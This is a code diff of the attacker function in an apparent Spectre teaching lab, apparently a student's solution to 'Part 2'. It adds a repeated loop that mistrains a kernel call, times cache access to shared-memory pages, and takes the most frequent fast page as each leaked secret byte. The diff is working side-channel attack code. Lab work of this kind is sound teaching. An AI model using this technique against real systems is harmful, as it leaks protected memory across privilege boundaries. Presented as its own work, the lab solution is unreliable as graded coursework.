@@ -38,36 +38,48 @@ static inline void call_kernel_part2(char *shared_memory, size_t offset) {
 int run_attacker(char *shared_memory) {
     char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
     size_t current_offset = 0;
+    int num_iterations = 100;
 
     printf("Launching attacker\n");
 
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
+        int page_stats[SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES] = {0};
 
         // [Part 2]- Fill this in!
         // leaked_byte = ??
-        for (int i = 0; i < 100; i++) {
-            for (int j = 0; j < 4; j++) {
-                init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
+        bool accessed = 0;
+        for (int iteration = 0; iteration < num_iterations; iteration++) {
+            init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
+            for (int i = 0; i < 100; i++) {
                 call_kernel_part2(shared_memory, 1);
             }
+
+            init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
+            for (int i = 0; i < 100; i++) {
+                call_kernel_part2(shared_memory, current_offset);
+            }
+            int page;
+
+            for (page = 0; page < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; page++) {
+                uint64_t access_time = time_access(&shared_memory[page * SHD_SPECTRE_LAB_PAGE_SIZE]);
+                if (access_time < 160) {
+                    //printf("access time %ld \n", access_time);
+                    break;
+                }
+            }
+            page_stats[page]++;
+
         }
 
-        init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
-        for (int i = 0; i < 100; i++) {
-            call_kernel_part2(shared_memory, current_offset);
-        }
-        int page;
-
-        for (page = 0; page < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; page++){
-            uint64_t access_time = time_access(&shared_memory[page * SHD_SPECTRE_LAB_PAGE_SIZE]);
-            if (access_time < 160) {
-                //printf("access time %ld \n", access_time);
-                break;
+        int max = 0;
+        for (int p = 0; p < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; p++) {
+            if (page_stats[p] > max) {
+                max = page_stats[p];
+                leaked_byte = (char)p;
             }
         }
-        //printf("%d \n", page);
-        leaked_byte = (char)page;
+        //leaked_byte = (char)page;
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
